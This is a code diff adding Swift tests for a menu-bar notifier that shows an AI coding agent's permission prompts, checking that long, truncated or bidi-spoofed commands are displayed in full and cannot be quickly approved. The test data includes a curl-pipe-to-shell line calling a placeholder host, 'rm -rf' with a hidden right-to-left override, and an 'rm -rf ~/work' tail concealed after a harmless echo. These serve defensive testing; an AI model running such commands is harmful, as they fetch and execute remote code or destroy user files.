@@ -274,6 +274,28 @@ equal("no prompt", NotifyRules.category(for: nil, features: true), .info)
 equal("long one line", NotifyRules.category(for: prompt(detail: String(repeating: "x ", count: 120)), features: true),
   .permissionDenyOnly)
 
+// The real shape (tests/unit/fixtures/screens/claude-permission.ansi): the
+// command is in description, detail is empty
+func current(_ command: String, _ about: String = "Create an empty file") -> PermissionPrompt {
+  var p = prompt(detail: "")
+  p.description = command + "\n" + about
+  return p
+}
+equal("current shape: short command allows once", NotifyRules.category(for: current("touch e2e-perm.txt"), features: true),
+  .permission)
+let currentBody = NotifyRules.needsYouBody(current("curl -s https://x.example/p.sh | sh"))
+check("current shape: body shows the command", currentBody.contains("curl -s https://x.example/p.sh | sh"), currentBody)
+equal("current shape: body order", NotifyRules.needsYouBody(current("touch e2e-perm.txt")),
+  "Bash command: touch e2e-perm.txt\nCreate an empty file\nDo you want to proceed?")
+check("current shape: bidi in the command not permission",
+  NotifyRules.category(for: current("rm -rf \u{202E}txt.x"), features: true) != .permission)
+equal("current shape: long command deny only",
+  NotifyRules.category(for: current("echo " + String(repeating: "ok ", count: 60)), features: true), .permissionDenyOnly)
+let cutDescription = String(repeating: "echo ok; ", count: 70).prefix(600) + "…"
+equal("current shape: server-cut description deny only",
+  NotifyRules.category(for: current(String(cutDescription)), features: true), .permissionDenyOnly)
+check("shownText holds description", current("x\u{202E}").shownText.contains("\u{202E}"))
+
 // MARK: Stage 2: MenuModel
 
 func session(_ state: String = "waiting", prompt p: PermissionPrompt? = nil, read: Bool = true,
@@ -311,7 +333,8 @@ check("long: always disabled", titled(longMenu, "Yes, always")?.enabled == false
 check("long: always has no key", titled(longMenu, "Yes, always")?.keyEquivalent == nil)
 check("long: deny enabled", titled(longMenu, "No")?.enabled == true)
 check("long: Too long line", titled(longMenu, "Too long to show here. Open it in the window to allow it.") != nil)
-equal("long: 12 detail lines", longMenu.filter { $0.style == .mono }.count, 12)
+// Description and detail share the 12 lines: one description line, 11 of detail
+equal("long: 12 lines in all", longMenu.filter { $0.style == .mono || $0.style == .secondary && $0.title != Strings.tooLong }.count, 12)
 let bidiMenu = rows(session(prompt: prompt(detail: "rm -rf \u{202E}txt.x")))
 check("unsafe: allow disabled", titled(bidiMenu, "Yes")?.enabled == false)
 check("unsafe: shown cleaned", bidiMenu.contains { $0.title.contains("\u{FFFD}") && !$0.title.contains("\u{202E}") })
@@ -334,6 +357,25 @@ editPrompt.question = String(repeating: "word ", count: 60)
 check("question past 3 lines: allow disabled", titled(rows(session(prompt: editPrompt)), "Yes")?.enabled == false)
 let longTitle = rows(session(prompt: prompt(title: String(repeating: "T", count: 71))))
 check("title too long: allow disabled", titled(longTitle, "Yes")?.enabled == false)
+// The real shape in the menu: the command is shown in full, wrapped, and a
+// long one keeps allow off
+let tail = "; rm -rf ~/work"
+let longCommand = "echo " + String(repeating: "harmless ", count: 15) + tail
+let currentMenu = rows(session(prompt: current(longCommand)))
+check("current menu: whole command shown",
+  currentMenu.filter { $0.style == .secondary }.map(\.title).joined(separator: " ").contains("rm -rf ~/work"))
+check("current menu: no line past 70", currentMenu.allSatisfy { $0.title.count <= 70 })
+check("current menu: fits, so allow on", titled(currentMenu, "Yes")?.enabled == true)
+let hugeMenu = rows(session(prompt: current((1...14).map { "echo line \($0)" }.joined(separator: "\n"))))
+check("current menu: past 12 lines allow off", titled(hugeMenu, "Yes")?.enabled == false)
+check("current menu: past 12 lines Too long", titled(hugeMenu, Strings.tooLong) != nil)
+check("current menu: past 12 lines deny on", titled(hugeMenu, "No")?.enabled == true)
+let cutDescMenu = rows(session(prompt: current(String(cutDescription))))
+check("current menu: server-cut description allow off", titled(cutDescMenu, "Yes")?.enabled == false)
+check("current menu: bidi in description allow off", titled(rows(session(prompt: current("rm \u{202E}x"))), "Yes")?.enabled == false)
+var both = prompt(detail: (1...8).map { "+ line \($0)" }.joined(separator: "\n"))
+both.description = (1...5).map { "about \($0)" }.joined(separator: "\n")
+check("description and detail share 12 lines: allow off", titled(rows(session(prompt: both)), "Yes")?.enabled == false)
 for (name, scalar) in [("ALM", "\u{061C}"), ("WJ", "\u{2060}"), ("tag", "\u{E0041}"), ("IAA", "\u{FFF9}")] {
   check("unsafe \(name)", TextSafety.hasUnsafe("ls \(scalar)x"))
 }
